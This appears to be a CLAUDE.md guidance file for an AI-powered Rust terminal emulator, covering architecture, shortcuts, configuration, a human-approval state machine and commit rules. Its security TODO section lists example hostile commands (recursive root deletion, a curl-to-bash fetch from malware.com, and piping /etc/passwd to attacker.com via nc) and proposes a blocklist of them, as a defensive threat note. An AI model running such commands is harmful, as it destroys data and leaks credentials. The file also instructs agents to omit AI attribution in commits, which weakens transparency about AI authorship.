# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Overview

**Infraware Terminal** is an AI-powered terminal emulator built with egui. It combines VTE-based terminal emulation with an integrated LLM agent for DevOps assistance (command suggestions, error handling, natural language queries).

**Tech Stack**: Rust + egui/eframe + VTE + portable-pty + tokio (async) + reqwest (HTTP/SSE)
**Status**: Terminal + LLM Integration Complete (0 clippy warnings, Microsoft Pragmatic Rust Guidelines compliant)

**Prerequisites** (Linux): `sudo apt install -y pkg-config libssl-dev`

## Commands

```bash
# Build and Run
cargo run                            # Development (debug build)
cargo build --release                # Production build
cargo check                          # Fast type check
LOG_LEVEL=debug cargo run            # With debug logging

# Testing
cargo test                           # All tests (36 tests)
cargo test test_name                 # Single test
cargo test -- --nocapture            # With output

# Pre-commit (required)
cargo fmt && cargo clippy            # CI enforces both

# Coverage
cargo llvm-cov --all-features --workspace --lcov --output-path lcov.info
```

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                        User Input (egui)                            │
└─────────────────────────────────────────────────────────────────────┘
                                   │
                    ┌──────────────┴──────────────┐
                    ▼                              ▼
         ┌──────────────────┐          ┌─────────────────────┐
         │ KeyboardHandler  │          │ Magic Input (? ...)│
         └────────┬─────────┘          └──────────┬──────────┘
                  │                               │
                  ▼                               ▼
         ┌──────────────────┐          ┌─────────────────────┐
         │   PTY Writer     │          │ NaturalLanguage     │
         │                  │          │ Orchestrator        │
         └────────┬─────────┘          └──────────┬──────────┘
                  │                               │
                  ▼                               ▼
         ┌──────────────────┐          ┌─────────────────────┐
         │   Shell Process  │          │  LLM Client (SSE)   │
         │   (bash/zsh)     │          │  + HITL Orchestrator│
         └────────┬─────────┘          └──────────┬──────────┘
                  │                               │
                  ▼                               ▼
         ┌──────────────────┐          ┌─────────────────────┐
         │   PTY Reader     │          │ ResponseRenderer    │
         └────────┬─────────┘          │ (markdown→ANSI)     │
                  │                    └──────────┬──────────┘
                  ▼                               │
         ┌──────────────────┐                     │
         │   VTE Parser     │◄────────────────────┘
         └────────┬─────────┘
                  │
                  ▼
         ┌──────────────────┐
         │  Terminal Grid   │
         │  (scrollback)    │
         └────────┬─────────┘
                  │
                  ▼
         ┌──────────────────┐
         │  egui Renderer   │
         └──────────────────┘
```

### Core Components

| Component | Purpose |
|-----------|---------|
| **VTE Parser** | Parses ANSI escape sequences (CSI, SGR, cursor control) |
| **Terminal Grid** | 2D cell array with scrollback buffer |
| **PTY Session** | Bidirectional I/O with shell process |
| **egui Renderer** | Single-pass rendering with text batching |
| **LLM Client** | HTTP client with SSE streaming for LLM backend |
| **Orchestrators** | NaturalLanguage (queries) + HITL (command approval, questions) |
| **ResponseRenderer** | Markdown→ANSI conversion with syntax highlighting (syntect) |

### Quick Reference: Where to Find X

| Task | Location |
|------|----------|
| Add keyboard shortcut | `src/input/keyboard.rs` → `process_ctrl_keys()` or `process_other_keys()` |
| Modify terminal rendering | `src/app.rs` → `render_terminal()` |
| Modify scrollbar | `src/ui/scrollbar.rs` → `ScrollbarLogic` |
| Change cursor blink rate | `src/config.rs` → `timing::CURSOR_BLINK_INTERVAL` |
| Modify PTY spawn | `src/pty/mod.rs` → `Pty::spawn()` |
| Add VTE escape handler | `src/terminal/handler.rs` → `csi_dispatch()` |
| Modify cell attributes | `src/terminal/cell.rs` → `CellAttrs` |
| Change theme colors | `src/ui/theme.rs` → `Theme` struct |
| Add app mode | `src/state.rs` → `AppMode` enum |
| Modify LLM query flow | `src/orchestrators/natural_language.rs` → `NaturalLanguageOrchestrator` |
| Handle HITL interrupts | `src/orchestrators/hitl.rs` → `HitlOrchestrator` |
| Change LLM response rendering | `src/llm/renderer.rs` → `ResponseRenderer` |
| Add text selection | `src/input/selection.rs` → `SelectionState` |

### Key Modules

| Directory | Purpose |
|-----------|---------|
| `auth/` | Authentication: `authenticator.rs` (Authenticator trait + HTTP/Mock impl), `config.rs` (AuthConfig), `models.rs` (request/response structs) |
| `terminal/` | VTE: `grid.rs` (terminal grid + scrollback), `cell.rs` (cell attributes), `handler.rs` (escape sequence handler) |
| `pty/` | PTY: `manager.rs` (coordinator), `session.rs` (session lifecycle), `io.rs` (async reader/writer), `traits.rs` (DI traits) |
| `input/` | Input: `keyboard.rs` (keyboard event mapping), `selection.rs` (text selection state) |
| `ui/` | UI: `renderer.rs` (egui helpers), `theme.rs` (colors), `scrollbar.rs` (scrollbar logic) |
| `llm/` | LLM: `client.rs` (HTTP+SSE client with HITL), `renderer.rs` (markdown→ANSI with syntect) |
| `orchestrators/` | Workflows: `natural_language.rs` (LLM queries), `hitl.rs` (human-in-the-loop approval) |
| `app.rs` | Main egui application with rendering loop |
| `state.rs` | Application state machine (AppMode, transitions) |
| `config.rs` | Configuration constants (timing, rendering, sizes) |

### Design Patterns
- **State Machine**: `state.rs` (AppMode with validated transitions)
- **Dependency Injection**: `pty/traits.rs` (PtyWrite, PtyControl), `llm/client.rs` (LLMClientTrait)
- **Single-Pass Rendering**: `app.rs` (batched backgrounds, text, decorations)
- **Orchestrator Pattern**: `orchestrators/` (workflow coordination for LLM + HITL)
- **SSE Streaming**: `llm/client.rs` (real-time LLM responses via Server-Sent Events)

## Keyboard Shortcuts (Active)

| Shortcut | Action | Bytes Sent |
|----------|--------|------------|
| `Ctrl+C` | Interrupt (SIGINT) | 0x03 |
| `Ctrl+D` | EOF | 0x04 |
| `Ctrl+L` | Clear screen | 0x0C |
| `Ctrl+A` | Start of line | 0x01 |
| `Ctrl+E` | End of line | 0x05 |
| `Ctrl+K` | Kill to end | 0x0B |
| `Ctrl+U` | Kill to start | 0x15 |
| `Ctrl+W` | Delete word | 0x17 |
| `Ctrl+R` | Reverse search | 0x12 |
| `Ctrl+Z` | Suspend | 0x1A |
| `Alt+B` | Back word | ESC-b |
| `Alt+F` | Forward word | ESC-f |
| `Alt+D` | Delete word | ESC-d |
| Arrow keys | Navigation | VT100 codes |
| Page Up/Down | Scroll viewport | VT100 codes |
| Home/End | Line edges | VT100 codes |
| F1-F12 | Function keys | VT100 codes |

## Feature Status

### Active Features
- Full VTE terminal emulation (ANSI escape sequences)
- Terminal grid with scrollback buffer
- Mouse wheel scrolling with visual scrollbar
- Cursor blinking (530ms interval)
- 256-color and RGB color support
- Cell attributes (bold, dim, underline, reverse, strikethrough)
- Alternate screen buffer (for vim, less, etc.)
- PTY with async I/O and backpressure
- SIGINT propagation to foreground process
- Reactive repaint (CPU <5% when idle)
- **Magic Input (`?`)**: Prefix with `?` to query LLM directly (e.g., `? how do I revert a git commit`)
- **LLM Integration**: HTTP/SSE client with streaming responses
- **Human-in-the-Loop (HITL)**: Command approval and question answering workflows
- **Markdown Rendering**: LLM responses rendered with syntax highlighting (syntect)

### Not Implemented
- Command classification (SCAN algorithm)
- Shell builtins recognition
- History expansion (!!, !$)
- Alias expansion
- Background job management
- Command confirmations (rm -i)
- Multilingual patterns

## Configuration

### Environment Variables

Set via shell or `.env` file (loaded automatically via `dotenvy`):

```bash
INFRAWARE_BACKEND_URL="http://your-backend-api.com"  # LLM backend URL
ANTHROPIC_API_KEY="your-api-key"                     # API key for authentication
LOG_LEVEL="debug"                                    # Logging level (debug, info, warn, error)
```

At startup, the terminal authenticates via `POST /api/auth`. If authentication fails or no API key is configured, it falls back to `MockLLMClient` for testing.

### Constants (src/config.rs)

```rust
// Timing
CURSOR_BLINK_INTERVAL: 530ms
SHELL_INIT_DELAY: 500ms
RESIZE_DEBOUNCE: 100ms
BACKGROUND_REPAINT: 500ms

// Rendering
MAX_BYTES_PER_FRAME: 4096
FONT_SIZE: 14.0
CHAR_WIDTH: 8.4
CHAR_HEIGHT: 16.0

// Size
DEFAULT_ROWS: 24
DEFAULT_COLS: 80

// PTY
CHANNEL_CAPACITY: 4 (for backpressure)
```

## Development Guidelines

### Adding Keyboard Shortcuts
1. Edit `src/input/keyboard.rs`
2. Add to `process_ctrl_keys()` for Ctrl combinations
3. Add to `process_other_keys()` for special keys
4. Return `KeyboardAction::SendBytes(vec![...])` with appropriate bytes

### Adding VTE Escape Sequences
1. Edit `src/terminal/handler.rs`
2. Add match arm in `csi_dispatch()` for CSI sequences
3. Add match arm in `esc_dispatch()` for ESC sequences
4. Update grid state via `self.grid` methods

### Testing PTY Operations
Use the DI traits in `src/pty/traits.rs`:
```rust
// Create mock for testing
struct MockPtyWriter { ... }
impl PtyWrite for MockPtyWriter {
    fn write_bytes(&self, data: &[u8]) -> Result<usize> { ... }
}
```

### Performance Optimization
- `render_terminal()` uses single-pass rendering - don't add extra iterations
- Pre-allocate buffers outside loops (see `bg_rects`, `text_runs`, `decorations`)
- Use `column_x_coords` cache for X position lookups
- Limit PTY output to `MAX_BYTES_PER_FRAME` per frame

## Constraints

### CI/CD
- `cargo fmt --all --check` and `cargo clippy -- -D warnings` must pass
- Multi-platform: Linux (primary), Windows, macOS

### Git Commits
- Use conventional commit format: `<type>: <description>`
- Types: `feat`, `fix`, `refactor`, `docs`, `test`, `chore`, `perf`, `style`
- Maximum 50 characters for subject line, imperative mood ("Add" not "Added")
- **NO** Co-Authored-By, emojis, or AI attribution
- Run `cargo fmt` before committing

### Code Style
- Safe indexing (`.first()`, `.get()`) - no `parts[0]` or `.unwrap()` on arrays
- Prefer zero-copy and CoW over clone
- No dead code (use `#[allow(dead_code)]` with comment for intentional placeholders)

### Microsoft Pragmatic Rust Guidelines

**Key requirements:**
- All public types implement `Debug` (custom impl for sensitive data)
- Use `#[expect]` instead of `#[allow]` when lint suppression should be revisited
- Lock poisoning triggers fail-fast with `.expect()` (M-PANIC-IS-STOP)

### Error Handling
Use `anyhow::Result`. Display user-friendly messages, never crash.

### Logging
Standard `log` crate. `LOG_LEVEL=debug cargo run` for debug output.

## State Machine (AppMode)

```rust
pub enum AppMode {
    Normal,                           // Default state
    WaitingLLM,                       // Querying LLM
    AwaitingApproval { command, message },  // LLM wants to execute command (y/n)
    AwaitingAnswer { question, options },   // LLM asks question (free-text)
}
```

Valid transitions:
- `Normal → WaitingLLM` (QueryLLM event)
- `WaitingLLM → Normal` (LLMCompleted event)
- `WaitingLLM → AwaitingApproval` (LLMRequestsApproval event)
- `WaitingLLM → AwaitingAnswer` (LLMAsksQuestion event)
- `AwaitingApproval → Normal` (UserResponded event)
- `AwaitingAnswer → Normal` (UserAnswered event)
- `Any → Normal` (Cancel event)

## Claude Code Agents

Agents in `.claude/agents/` are invoked automatically when appropriate:

| Agent | Purpose |
|-------|---------|
| `rust-clippy-enforcer` | Run clippy and fix warnings (before commits) |
| `rust-code-reviewer` | Code review for best practices |
| `code-metrics-analyzer` | LOC, complexity metrics |
| `docs-updater` | Update CLAUDE.md/README.md |
| `git-committer` | Create commits (no emojis, no Co-Author) |
| `uml-diagram-generator` | Generate PlantUML diagrams for code structure |

## Code Metrics Summary

| Metric | Value |
|--------|-------|
| Total LOC | ~7,000 |
| Source files | 30 |
| Tests | 36 |
| Largest file | `llm/client.rs` (~900 LOC) |
| Highest complexity | `render_terminal()` (CC ~28) |

## Platform Notes

**Linux**: Primary platform. Full PTY support.

**Windows**: PTY via ConPTY. Some escape sequences may differ.

**macOS**: Full PTY support. Similar to Linux.

## Known Issues & Security TODOs

### Command Injection Risk (Medium-High Priority)

**Location**: `src/app.rs:693-695` (submit_hitl_input)

**Issue**: LLM-suggested commands are sent directly to PTY without validation:
```rust
let cmd_bytes = format!("{}\n", command);
self.send_to_pty(cmd_bytes.as_bytes());  // No validation!
```

**Risk**: A compromised or malicious LLM could suggest destructive commands:
- `rm -rf /` - System destruction
- `curl http://malware.com/script.sh | bash` - Remote code execution
- `cat /etc/passwd | nc attacker.com 1234` - Data exfiltration

**Mitigation (TODO)**:
1. Implement command validation/sanitization before execution
2. Maintain blocklist of dangerous patterns (rm -rf /, mkfs, dd if=, fork bombs)
3. Block pipes to network commands (nc, curl, wget) without explicit approval
4. Add "dangerous command" warning with red highlighting for risky commands
5. Consider sandboxing or dry-run mode for untrusted commands

**Severity**: Depends on LLM trust level and user attentiveness during approval.

### Other TODOs

- [ ] Add rate limiting for LLM queries
- [ ] Implement custom error types instead of generic `anyhow`
- [ ] Add unit tests for LLM orchestration (critical path untested)
- [ ] Refactor `app.rs` (1,345 LOC) into smaller modules
